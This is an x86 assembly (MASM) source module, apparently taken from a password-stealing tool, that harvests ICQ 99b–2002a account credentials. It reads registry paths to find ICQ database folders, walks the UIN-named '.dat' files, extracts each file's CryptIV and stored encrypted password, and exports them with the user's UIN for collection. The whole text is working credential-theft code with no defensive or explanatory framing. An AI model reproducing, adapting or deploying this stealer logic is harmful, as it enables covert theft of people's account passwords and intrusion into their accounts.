; ICQ99b-ICQ2002a
; Tested on:
;	ICQ99b, build 2569
;	ICQ2000a, build 3143	
;	ICQ2000b, build 3286
;	ICQ2001a/ICQ2001b: failed to install, but should work as well
;	ICQ2002a, build 3729

.data
	szICQ99bKeyPath db      "SOFTWARE\Mirabilis\ICQ\DefaultPrefs",0
	szICQ99bFmt	db	"%s Database",0
	szICQ99bDatDirs	db      "99b",0,0,0
			db      "2000a",0
			db      "2000b",0
			db      "2001a",0
			db      "2002a",0
			
	; CryptIV
	ICQ99bParam1	db	0Bh, 00h, 39h, 39h
			db	42h, 43h, 72h, 79h
			db	70h, 74h, 49h, 56h
			db	00h, 68h
			
	; Password
	ICQ99bParam2	db	09h, 00h, 50h, 61h 
			db	73h, 73h, 77h, 6Fh
			db	72h, 64h, 00h, 6bh
			
			
	@AllocMem <lpICQ99bCommonBuf>, <MAX_PATH+1>
	@AllocMem <lpICQ99bUINBuf>, <MAX_PATH+1>
	
.code

; Check if lpStr is a number
IsNumber proc uses esi lpStr: DWORD
	invoke	lstrlen, lpStr
	test	eax, eax
	jz	@exit
	
	mov	esi, lpStr
	xor	eax, eax
	
@l:
	.IF	!((byte ptr[esi] >= '0') && (byte ptr[esi] <= '9'))
		jmp	@exit
	.ENDIF	
	inc	esi
	cmp	byte ptr[esi], 0
	jnz	@l
	
	inc	eax
	
@exit:
	ret
IsNumber endp

; Read passwords from .dat file
Read99bPass proc uses esi
	LOCAL	CryptIV: DWORD
	LOCAL	hMap: MappedFile
	
	mov	CryptIV, 0
	invoke	MapFile, offset lpICQ99bCommonBuf, addr hMap	
	.IF	(eax) && (hMap.dwFileSize >= 1024)
		mov	ecx, hMap.dwFileSize
		sub	ecx, 32
		mov	esi, hMap.lpMem
		
	@l:
		push	ecx
		
		; CryptIV
		invoke	CompareMem, esi, offset ICQ99bParam1, 14
		.IF	eax
			m2m	CryptIV, dword ptr[esi+14]
		.ENDIF
		
		; Password
		invoke	CompareMem, esi, offset ICQ99bParam2, 12
		.IF	eax
			.IF	(CryptIV) && (byte ptr[esi+14]) && (word ptr[esi+12] > 0)
				invoke	ExportData, TYPE_ICQ99b_PASS, SUBTYPE_ICQ99b_CRYPTIV, addr CryptIV, 4
				mov	edx, [esp]		; ecx-on-stack
				movzx	ecx, word ptr[esi+12] 	; Length of the hex string
				sub	edx, ecx
				.IF	!SIGN?			; Check for EOF
					lea	eax, [esi+14]	; String pointer
					invoke	ExportData, TYPE_ICQ99b_PASS, SUBTYPE_ICQ99b_PASS, eax, ecx
				.ENDIF
			.ENDIF
			mov	CryptIV, 0
		.ENDIF
		pop	ecx
		inc	esi
		loop	@l
	.ENDIF

	invoke	UnmapFile, addr hMap 
	ret
Read99bPass endp

; Scan directory for valid .dat files
Get99bPass proc uses edi
	LOCAL   FindFileData: WIN32_FIND_DATA
	LOCAL   hFind: DWORD
	
	invoke	lstrlen, offset lpICQ99bCommonBuf
	lea	edi, [eax+offset lpICQ99bCommonBuf+1]        
        invoke	lstrcat, offset lpICQ99bCommonBuf, offset szICQ99bSearch
        	
	invoke  FindFirstFile, offset lpICQ99bCommonBuf, addr FindFileData
	mov     hFind, eax
	inc     eax
	jz      @ret	
        
@find_loop:                
        cmp	FindFileData.cFileName[0], '.'
        jz	@level_up_skip
        
        invoke	lstrcpy, edi, addr FindFileData.cFileName
        
        ; Cut file extension
        invoke	lstrlen, edi
        sub	eax, 3
       	invoke	lstrcpyn, offset lpICQ99bUINBuf, edi, eax
       	
       	; Check for UIN.dat validness
       	invoke	IsNumber, offset lpICQ99bUINBuf 
       	.IF	eax
		invoke	ExportStr, TYPE_ICQ99b_UIN, 0, offset lpICQ99bUINBuf
		; Finally, get the password from .dat file
		invoke	Read99bPass       			
	.ENDIF        	 

@level_up_skip:
	invoke  FindNextFile, hFind, addr FindFileData
	test    eax, eax
	jnz	@find_loop

	invoke  FindClose, hFind

@ret:	
	ret
Get99bPass endp

Get99bDatDir proc shKey, szKey: DWORD
	LOCAL	dwBufSize: DWORD

	; Query .dat dir path
	mov     dwBufSize, MAX_PATH
	invoke	RegReadValue, shKey, offset szICQ99bKeyPath, szKey, offset lpICQ99bCommonBuf, addr dwBufSize
        .IF	eax
		invoke	Get99bPass
        .ENDIF
        
	ret
Get99bDatDir endp 

Get99bOutput proc uses esi edi
	LOCAL	szDatPath[20]: BYTE
	
	; Write header	
	invoke	ExportModule, MODULE_ICQ_99b

	mov	edi, offset szICQ99bDatDirs
	mov	esi, 5
	
	; Query registry for .dat file dirs
@l:
	invoke	wsprintf, addr szDatPath, offset szICQ99bFmt, edi
	invoke	Get99bDatDir, HKEY_CURRENT_USER, addr szDatPath
	invoke	Get99bDatDir, HKEY_LOCAL_MACHINE, addr szDatPath 	 	
	add	edi, 6
	dec	esi
	jnz	@l

	ret
Get99bOutput endp
